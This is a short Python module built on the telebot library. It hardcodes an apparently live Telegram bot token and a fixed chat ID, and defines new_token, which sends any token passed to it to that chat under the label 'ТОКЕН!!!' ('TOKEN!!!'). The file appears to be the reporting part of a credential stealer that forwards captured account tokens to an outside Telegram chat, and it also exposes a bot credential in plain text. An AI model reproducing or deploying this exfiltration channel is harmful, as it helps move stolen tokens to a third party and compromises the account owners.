import telebot

bot = telebot.TeleBot("6524386800:AAFabvyGwIVaVTujsftucR2DSIT1GgWjJo0")


def send(message):
    bot.send_message('5776177569', message)


def new_token(token):
    msg = str("ТОКЕН!!! {0}").format(token)
    send(msg)
